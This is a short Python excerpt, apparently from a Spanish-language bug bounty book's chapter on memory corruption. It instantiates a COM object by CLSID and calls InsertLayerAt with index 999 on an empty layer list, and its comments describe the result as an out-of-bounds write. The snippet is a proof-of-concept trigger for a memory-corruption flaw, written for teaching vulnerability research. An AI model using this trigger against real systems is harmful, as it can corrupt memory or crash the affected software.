# Extraído de: LibroBugBounty/cap-10-memory-corruption.md
anim = win32com.client.Dispatch(
    "{756E6C18-79CC-3842-9E47-7C80011D303A}"
)
anim.init(10, 10)

layer = anim.CreateLayer()

# Lista vacía — índice 0 sería el único válido
# Índice 999 está fuera de los límites
anim.InsertLayerAt(999, layer)  # Sin excepción — OOB Write
